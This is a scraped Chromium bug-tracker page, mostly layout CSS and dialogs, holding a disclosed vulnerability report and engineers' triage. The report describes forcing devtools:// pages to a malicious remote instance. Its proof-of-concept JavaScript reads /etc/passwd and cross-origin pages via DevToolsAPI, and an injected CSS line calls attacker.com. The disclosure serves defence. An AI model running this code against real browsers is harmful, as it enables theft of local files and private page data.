    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

        mr-issue-page {

        }
        mr-issue-page[issueClosed] {

          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      <mr-click-throughs></mr-click-throughs>

 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };

 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };
<script type="text/javascript" nonce="">
 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };
</script>

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->?<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->show this help dialog<!----></span>
              <!---->
            </div>
          
        <div class="keyboard-help">
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Issue list<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>

              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->o<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->Enter<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->open the current issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->Shift-O<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>

                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->select the current issue<!----></span>
              <!---->
            </div>
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Issue details<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>

                  <!---->

                  <!---->:
                </span>

              <!---->
            </div>
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Anywhere<!----></span>

              <!---->

                  <!---->
                    <kbd><!---->s<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:

          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

            Issue 1049265: Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.
          <h1>

          </h1>
          
            Reported by
            
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>

        warning
      <i class="warning-icon material-icons" icon="warning" hidden="" title="">
        warning
      </i>
      
    <mr-restriction-indicator hidden=""></mr-restriction-indicator>
              
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      warning<i class="warning-icon material-icons" icon="warning">warning</i>
      This issue has been migrated to Launch, see link in final comment below.<p>This issue has been migrated to Launch, see link in final comment below.</p>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>It is possible to use the "ws" and "wss" parameters on the devtools://devtools/bundled/inspector.html endpoint to force it to connect to a malicious remote Chrome instance.<span class="line"><!---->It is possible to use the "ws" and "wss" parameters on the devtools://devtools/bundled/inspector.html endpoint to force it to connect to a malicious remote Chrome instance.<!----></span><br><br>Afterwards, the Chrome instance can execute:<span class="line"><!---->Afterwards, the Chrome instance can execute:<!----></span><br>console.log("%c", "background:url(<span class="line"><!---->console.log("%c", "background:url(<!----></span>https://attacker.com/img.png)");<a class="undefined" target="_blank" href="https://attacker.com/img.png)&quot;);"><!---->https://attacker.com/img.png)");<!----></a><br><br>Which will be reflected inside the privileged devtools:// page and execute the CSS. The image will also be rendered inside the page.<span class="line"><!---->Which will be reflected inside the privileged devtools:// page and execute the CSS. The image will also be rendered inside the page.<!----></span><br><br>This can lead to the privileged process being compromised by a bug in the CSS parser / image parser.<span class="line"><!---->This can lead to the privileged process being compromised by a bug in the CSS parser / image parser.<!----></span><br><br>Once the renderer process is compromised, the attacker would be able to run arbitrary javascript and read local files / cross-origin pages by leveraging the DevToolsAPI.<span class="line"><!---->Once the renderer process is compromised, the attacker would be able to run arbitrary javascript and read local files / cross-origin pages by leveraging the DevToolsAPI.<!----></span><br><br>// Reading local files<span class="line"><!---->// Reading local files<!----></span><br>var data = "";<span class="line"><!---->var data = "";<!----></span><br><br>DevToolsAPI.streamWrite = function(id, chunk) {<span class="line"><!---->DevToolsAPI.streamWrite = function(id, chunk) {<!----></span><br>    data += chunk;<span class="line"><!---->    data += chunk;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>DevToolsAPI.sendMessageToEmbedder(<span class="line"><!---->DevToolsAPI.sendMessageToEmbedder(<!----></span><br>    "loadNetworkResource",<span class="line"><!---->    "loadNetworkResource",<!----></span><br>    [ "file:///etc/passwd", "", 0 ],<span class="line"><!---->    [ "file:///etc/passwd", "", 0 ],<!----></span><br>    function (result) {<span class="line"><!---->    function (result) {<!----></span><br>        console.log(data);    <span class="line"><!---->        console.log(data);    <!----></span><br>    }<span class="line"><!---->    }<!----></span><br>);<span class="line"><!---->);<!----></span><br><br>// Reading cross-origin page<span class="line"><!---->// Reading cross-origin page<!----></span><br>var data = "";<span class="line"><!---->var data = "";<!----></span><br><br>DevToolsAPI.streamWrite = function(id, chunk) {<span class="line"><!---->DevToolsAPI.streamWrite = function(id, chunk) {<!----></span><br>    data += chunk;<span class="line"><!---->    data += chunk;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>DevToolsAPI.sendMessageToEmbedder(<span class="line"><!---->DevToolsAPI.sendMessageToEmbedder(<!----></span><br>    "loadNetworkResource",<span class="line"><!---->    "loadNetworkResource",<!----></span><br>    [ "<span class="line"><!---->    [ "<!----></span>https://www.google.com/<a class="undefined" target="_blank" href="https://www.google.com/"><!---->https://www.google.com/<!----></a>",<span class="line"><!---->",<!----></span> "", 0 ],<span class="line"><!----> "", 0 ],<!----></span><br>    function (result) {<span class="line"><!---->    function (result) {<!----></span><br>        console.log(data);<span class="line"><!---->        console.log(data);<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>);<span class="line"><!---->);<!----></span><br><br>Besides the ability to compromise the renderer, the attacker needs to have control over an extension without any privilege that is installed in the victim's browser since the devtools:// page can't normally be launched from the web.<span class="line"><!---->Besides the ability to compromise the renderer, the attacker needs to have control over an extension without any privilege that is installed in the victim's browser since the devtools:// page can't normally be launched from the web.<!----></span><br><br>I have also uploaded an unlisted video demonstrating the issue:<span class="line"><!---->I have also uploaded an unlisted video demonstrating the issue:<!----></span><br>https://www.youtube.com/watch?v=ocwp40yZiM4<a class="undefined" target="_blank" href="https://www.youtube.com/watch?v=ocwp40yZiM4"><!---->https://www.youtube.com/watch?v=ocwp40yZiM4<!----></a><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Version 80.0.3987.87 (Official Build) (64-bit)<span class="line"><!---->Version 80.0.3987.87 (Official Build) (64-bit)<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>1. Run ./chrome --remote-debugging-port=9222 to simulate the attacker's browser instance.<span class="line"><!---->1. Run ./chrome --remote-debugging-port=9222 to simulate the attacker's browser instance.<!----></span><br>2. Open <span class="line"><!---->2. Open <!----></span>http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html<a class="undefined" target="_blank" href="http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html"><!---->http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html<!----></a><br>3. Copy the ID of the page.<span class="line"><!---->3. Copy the ID of the page.<!----></span><br>4. Download and unzip the extension.<span class="line"><!---->4. Download and unzip the extension.<!----></span><br>5. Change the pageID variable in the "script.js" file to the ID you just retrieved.<span class="line"><!---->5. Change the pageID variable in the "script.js" file to the ID you just retrieved.<!----></span><br>6. Install the extension on your browser.<span class="line"><!---->6. Install the extension on your browser.<!----></span><br>7. A new window should open automatically displaying an image rendered inside the devtools:// page.<span class="line"><!---->7. A new window should open automatically displaying an image rendered inside the devtools:// page.<!----></span><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br>Reporter credit: Luan Herrera (@lbherrera_)<span class="line"><!---->Reporter credit: Luan Herrera (@lbherrera_)<!----></span><mr-comment-content></mr-comment-content>

        It's unclear to me what the issue is here. If a user opens up devtools and connects to a remote debugging endpoint, the endpoint will be able to interact with devtools, so that part is working as intended, there are some mitigations in Chrome, such as not being able to open devtools:// links from other sites.<span class="line"><!---->It's unclear to me what the issue is here. If a user opens up devtools and connects to a remote debugging endpoint, the endpoint will be able to interact with devtools, so that part is working as intended, there are some mitigations in Chrome, such as not being able to open devtools:// links from other sites.<!----></span><br><br>If you also have bugs that perform the "compromise the renderer by a bug in the CSS parser / image parser." those would be valid bugs, so please report them separately.<span class="line"><!---->If you also have bugs that perform the "compromise the renderer by a bug in the CSS parser / image parser." those would be valid bugs, so please report them separately.<!----></span><mr-comment-content></mr-comment-content>

        This issue describes an escalation of privilege that could be achieved when an attacker can compromise the renderer through a bug in the CSS parser / image parser since attacker-controlled data is being rendered inside a privileged page.<span class="line"><!---->This issue describes an escalation of privilege that could be achieved when an attacker can compromise the renderer through a bug in the CSS parser / image parser since attacker-controlled data is being rendered inside a privileged page.<!----></span><br><br>It is my understanding that a compromised renderer shouldn't be able to read cross-origin pages nor local files under Chrome's current security model.<span class="line"><!---->It is my understanding that a compromised renderer shouldn't be able to read cross-origin pages nor local files under Chrome's current security model.<!----></span><br><br>As for the mitigation you talked about - in the report it is demonstrated that an extension without any permission can force the user to open devtools://<span class="line"><!---->As for the mitigation you talked about - in the report it is demonstrated that an extension without any permission can force the user to open devtools://<!----></span><mr-comment-content></mr-comment-content>

          Summary:<strong><!---->Summary:</strong>
          
          Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.
          (was: Same-origin policy bypass / Site Isolation bypass / Local file read when compromising renderer on devtools://)
          <br>
        
          Status:<strong><!---->Status:</strong>
          
          Assigned
          (was: WontFix)
          <br>
        
          Owner:<strong><!---->Owner:</strong>
          
          lazyboy@chromium.org
          
          <br>
        
          Cc:<strong><!---->Cc:</strong>
          
          nparker@chromium.org
          
          <br>
        
          Labels:<strong><!---->Labels:</strong>
          
          Security_Impact-Stable Security_Severity-Medium M-80 OS-Chrome OS-Linux OS-Mac OS-Windows
          
          <br>
        
          Components:<strong><!---->Components:</strong>
          
          Platform>DevTools Platform>Extensions
          
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Summary:</strong>
          
          Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.
          (was: Same-origin policy bypass / Site Isolation bypass / Local file read when compromising renderer on devtools://)
          <br>
        <!---->
          <strong><!---->Status:</strong>
          
          Assigned
          (was: WontFix)
          <br>
        <!---->
          <strong><!---->Owner:</strong>
          
          lazyboy@chromium.org
          
          <br>
        <!---->
          <strong><!---->Cc:</strong>
          
          nparker@chromium.org
          
          <br>
        <!---->
          <strong><!---->Labels:</strong>
          
          Security_Impact-Stable Security_Severity-Medium M-80 OS-Chrome OS-Linux OS-Mac OS-Windows
          
          <br>
        <!---->
          <strong><!---->Components:</strong>
          
          Platform&gt;DevTools Platform&gt;Extensions
          
          <br>
        <!---->
        
      </div><br>
    
        
      
        It seems the issue here is that extensions can navigate to devtools://, since we don't otherwise allow navigations to that scheme. Otherwise I still think the inspector loading content written to the port it is connected to is working as intended. I'll reopen the bug and update the description. Labeling with medium severity since this requires an extension to be installed.<span class="line"><!---->It seems the issue here is that extensions can navigate to devtools://, since we don't otherwise allow navigations to that scheme. Otherwise I still think the inspector loading content written to the port it is connected to is working as intended. I'll reopen the bug and update the description. Labeling with medium severity since this requires an extension to be installed.<!----></span><br><br>lazyboy: Can you further triage?<span class="line"><!---->lazyboy: Can you further triage?<!----></span><mr-comment-content></mr-comment-content>

        by

          Owner:<strong><!---->Owner:</strong>
          
          tjudkins@chromium.org
          
          <br>
        
          Cc:<strong><!---->Cc:</strong>
          
          rdevl...@chromium.org
          
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Owner:</strong>
          
          tjudkins@chromium.org
          
          <br>
        <!---->
          <strong><!---->Cc:</strong>
          
          rdevl...@chromium.org
          
          <br>
        <!---->
        
      </div><br>
    
        
      
        We do allow extensions to navigate to more pages than on the web (e.g., chrome:-scheme pages), and this is important for some use cases.  I wonder if devtools is necessary, though.  I don't see a real compelling use case, but I could imagine some extensions allowing one-click debug or similar and opening up the inspector to a given page.<span class="line"><!---->We do allow extensions to navigate to more pages than on the web (e.g., chrome:-scheme pages), and this is important for some use cases.  I wonder if devtools is necessary, though.  I don't see a real compelling use case, but I could imagine some extensions allowing one-click debug or similar and opening up the inspector to a given page.<!----></span><br><br>The first step here is probably gathering some UMA to see whether or not we could just disallow devtools:// navigations.  Tim, do you think you could take this on?<span class="line"><!---->The first step here is probably gathering some UMA to see whether or not we could just disallow devtools:// navigations.  Tim, do you think you could take this on?<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        by

        <div>
          <a class="comment-link" href="?id=1049265#c28">Comment 28<!----></a>

          
        by
        <mr-user-link></mr-user-link>

        <chops-timestamp title="Sat, Mar 7, 2020, 5:13 AM EST"></chops-timestamp>

        Extensions can use the Chrome DevTools protocol directly. I don't think opening DevTools UI is documented or has much value. I think it's rather dangerous.<span class="line"><!---->Extensions can use the Chrome DevTools protocol directly. I don't think opening DevTools UI is documented or has much value. I think it's rather dangerous.<!----></span><br><br>We've had numerous user reports of DevTools annoyingly opening without their consent. We were wondering whether this was caused by extensions.<span class="line"><!---->We've had numerous user reports of DevTools annoyingly opening without their consent. We were wondering whether this was caused by extensions.<!----></span><br><br>Let's disable this and wait for feedback?<span class="line"><!---->Let's disable this and wait for feedback?<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
